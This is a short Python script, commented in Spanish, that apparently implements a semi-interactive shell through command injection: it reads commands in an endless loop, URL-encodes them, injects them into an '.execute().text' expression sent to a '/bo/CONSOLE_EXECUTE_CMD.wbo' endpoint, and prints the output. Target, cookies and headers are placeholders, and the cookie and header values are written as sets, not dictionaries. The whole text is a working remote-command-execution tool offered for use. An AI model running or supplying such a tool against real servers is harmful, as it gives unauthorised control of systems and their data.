#Para inyección de comandos, una shell medio interactiva. Usar python requests para coger la petición.

import requests, json
import urllib.parse
import readline

variable=""
burp0_url = "XXXXXX/bo/CONSOLE_EXECUTE_CMD.wbo?script=\""+variable+"\".execute().text;"
burp0_cookies = {"Cookie: XXXX"}
burp0_headers = {"XXXXX"}

i=1 #BUCLE INFINITO
while (i > 0 ):
    variable = input()
    variable = urllib.parse.quote(variable)
    burp0_url = "XXXX/bo/CONSOLE_EXECUTE_CMD.wbo?script=\"" + variable + "\".execute().text;"
    print(burp0_url)
    respuesta = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    x = json.loads(respuesta.text)
    print(x["result"])
    #print (respuesta.text)
